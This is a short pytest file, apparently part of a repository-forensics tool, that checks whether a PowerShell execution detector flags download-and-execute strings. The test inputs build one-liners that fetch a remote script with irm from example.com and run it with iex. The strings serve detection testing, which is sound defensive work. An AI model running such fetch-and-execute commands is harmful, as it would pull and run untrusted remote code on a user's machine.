"""Independent review set 2 (inert strings): result-type of comparison and cast expressions."""
import importlib,sys,pytest
from pathlib import Path
sys.path.insert(0,str(Path(__file__).resolve().parents[3] / 'skills/repo-forensics/scripts'))
P='$a=irm https://example.com/x.ps1; '
@pytest.mark.parametrize('module',['pre_scan','auto_scan'])
@pytest.mark.parametrize('expr',['@($a) -ne "safe"','@($a) -like "*"','$a + (1 -eq 1)'])
def test_text_survives_result_expression(module,expr):
 assert importlib.import_module(module).detects_powershell_execution(P+'$b='+expr+'; iex $b')
@pytest.mark.parametrize('module',['pre_scan','auto_scan'])
@pytest.mark.parametrize('expr',['[bool]($a)','[System.Boolean]($a)','"$([bool]$a)"'])
def test_boolean_expression_is_not_payload(module,expr):
 assert not importlib.import_module(module).detects_powershell_execution(P+'$b='+expr+'; iex "Write-Output $b"')
